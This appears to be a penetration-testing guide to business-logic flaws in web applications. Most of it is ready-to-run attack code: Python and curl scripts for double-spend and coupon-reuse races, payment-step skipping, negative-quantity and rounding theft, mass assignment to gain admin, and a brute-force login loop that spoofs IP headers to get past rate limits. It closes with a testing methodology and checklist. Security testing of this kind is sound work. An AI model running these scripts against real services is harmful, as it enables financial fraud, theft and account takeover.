# Business Logic Attack Patterns Guide

## Overview

Business logic vulnerabilities arise from flawed assumptions in application workflows rather than technical implementation bugs. They cannot be detected by automated scanners and require understanding of the intended business process.

---

## Race Conditions

### Double-Spend Attack

```python
import threading
import requests

target = "https://app.com/api/transfer"
headers = {"Authorization": "Bearer <token>"}

def transfer():
    requests.post(target, json={
        "from": "attacker",
        "to": "accomplice",
        "amount": 1000
    }, headers=headers)

# Fire 50 concurrent transfers when balance is only 1000
threads = [threading.Thread(target=transfer) for _ in range(50)]
for t in threads:
    t.start()
for t in threads:
    t.join()
```

### Coupon/Voucher Reuse

```bash
# Apply same coupon code concurrently
for i in $(seq 1 20); do
    curl -s -X POST "https://shop.com/api/cart/apply-coupon" \
        -H "Cookie: session=abc123" \
        -d '{"code":"SAVE50"}' &
done
wait
```

### Account Registration Race

```python
import asyncio
import aiohttp

async def register(session, email):
    async with session.post("https://app.com/register", json={
        "email": email,
        "password": "test123"
    }) as resp:
        return await resp.json()

async def main():
    async with aiohttp.ClientSession() as session:
        tasks = [register(session, "victim@example.com") for _ in range(10)]
        results = await asyncio.gather(*tasks)
        # Check if multiple accounts created with same email
        print(results)

asyncio.run(main())
```

---

## State Machine Abuse

### Order Status Manipulation

```yaml
Expected Flow: PENDING → PAID → SHIPPED → DELIVERED
Attack: Skip PAID state by directly requesting SHIPPED

Test:
  1. Create order (status: PENDING)
  2. Skip payment, directly call: POST /api/orders/{id}/ship
  3. Check if order ships without payment
```

```bash
# Test state transition bypass
ORDER_ID=$(curl -s -X POST "https://shop.com/api/orders" \
    -d '{"items":["item1"]}' | jq -r '.id')

# Skip payment, try to ship directly
curl -X POST "https://shop.com/api/orders/$ORDER_ID/ship"

# Try reverse transitions
curl -X POST "https://shop.com/api/orders/$ORDER_ID/cancel"  # After shipped
```

### Password Reset Flow Abuse

```yaml
Expected Flow: Request reset → Email sent → Click link → Set new password
Attack: Reuse reset token, use token for different account

Test:
  1. Request reset for attacker@evil.com
  2. Capture reset token from email
  3. Try applying token to victim@target.com
  4. Try reusing expired/used tokens
```

```bash
# Test token reuse
TOKEN="abc123def456"
# Use token once (legitimate)
curl -X POST "https://app.com/api/reset-password" \
    -d "{\"token\":\"$TOKEN\",\"password\":\"new1\"}"
# Try using same token again
curl -X POST "https://app.com/api/reset-password" \
    -d "{\"token\":\"$TOKEN\",\"password\":\"new2\"}"
```

---

## Price and Quantity Manipulation

### Negative Quantity

```bash
# Add item with negative quantity (credit instead of charge)
curl -X POST "https://shop.com/api/cart/add" \
    -d '{"product_id": "expensive_item", "quantity": -1}'

# Check if total becomes negative (refund)
curl "https://shop.com/api/cart/total"
```

### Integer Overflow

```bash
# Quantity that overflows to small number
curl -X POST "https://shop.com/api/cart/add" \
    -d '{"product_id": "item1", "quantity": 2147483647}'

# Price manipulation via floating point
curl -X POST "https://shop.com/api/cart/add" \
    -d '{"product_id": "item1", "price": 0.001}'
```

### Currency Rounding Exploitation

```python
# Exploit rounding in currency conversion
# If system rounds down: 0.004 USD → 0 cents
# But 1000 transactions of 0.004 = 4.00 USD never charged
for i in range(1000):
    requests.post("https://app.com/api/transfer", json={
        "amount": 0.004,
        "currency": "USD",
        "to": "attacker_account"
    })
```

---

## Trust Boundary Violations

### Parameter Pollution

```bash
# Duplicate parameters - which one wins?
curl "https://app.com/api/transfer?to=legitimate&to=attacker"
curl -X POST "https://app.com/api/transfer" \
    -d "to=legitimate&to=attacker&amount=100"
```

### Mass Assignment

```bash
# Add unexpected fields to update user role
curl -X PUT "https://app.com/api/users/me" \
    -H "Content-Type: application/json" \
    -d '{"name":"John","role":"admin","is_verified":true}'

# Add admin flag during registration
curl -X POST "https://app.com/api/register" \
    -d '{"email":"test@test.com","password":"pass","admin":true}'
```

### Workflow Bypass via Direct API Access

```bash
# Multi-step checkout: cart → address → payment → confirm
# Try skipping steps by calling confirm directly
curl -X POST "https://shop.com/api/checkout/confirm" \
    -H "Cookie: session=abc123" \
    -d '{"order_id": "12345"}'

# Modify order after payment but before fulfillment
curl -X PUT "https://shop.com/api/orders/12345" \
    -d '{"items": ["expensive_item"], "shipping": "free"}'
```

---

## Abuse Case Testing

### Referral System Abuse

```bash
# Self-referral
curl -X POST "https://app.com/api/referral/apply" \
    -d '{"code": "MY_OWN_CODE"}'

# Circular referral (A refers B, B refers A)
# Create account A with referral from B
# Create account B with referral from A
```

### Free Trial Abuse

```bash
# Re-register with same details after trial expires
# Test: email+tag@gmail.com, different phone format
curl -X POST "https://app.com/api/register" \
    -d '{"email":"user+trial2@gmail.com","name":"Same User"}'

# Test if trial check is client-side only
curl "https://app.com/api/premium/content" \
    -H "X-Trial-Active: true"
```

### Rate Limit Bypass for Brute Force

```bash
# Rotate through headers to bypass rate limiting
for i in $(seq 1 1000); do
    curl -X POST "https://app.com/api/login" \
        -H "X-Forwarded-For: 10.0.0.$((i % 255))" \
        -H "X-Real-IP: 192.168.1.$((i % 255))" \
        -d "{\"user\":\"admin\",\"pass\":\"pass$i\"}"
done
```

---

## Detection Methodology

### Step 1: Map Business Workflows

```markdown
1. Document all multi-step processes
2. Identify state transitions and their guards
3. List all assumptions about user behavior
4. Identify value-bearing operations (money, credits, access)
```

### Step 2: Challenge Assumptions

```markdown
For each assumption, ask:
- What if the user skips this step?
- What if the user repeats this step?
- What if two users do this simultaneously?
- What if the value is negative/zero/maximum?
- What if the user goes backwards in the flow?
```

### Step 3: Test Boundary Conditions

```markdown
- Minimum/maximum values for all numeric inputs
- Empty strings where text is expected
- Concurrent requests for non-idempotent operations
- Out-of-order API calls
- Expired/reused tokens and sessions
```

---

## Testing Checklist

- [ ] All multi-step workflows tested for step-skipping
- [ ] Race conditions tested on financial operations
- [ ] Negative/zero/overflow values tested on quantities and prices
- [ ] State machine transitions tested for illegal paths
- [ ] Mass assignment tested on all update endpoints
- [ ] Referral/reward systems tested for self-referral
- [ ] Rate limits tested for bypass via header manipulation
- [ ] Token reuse tested on all one-time-use tokens
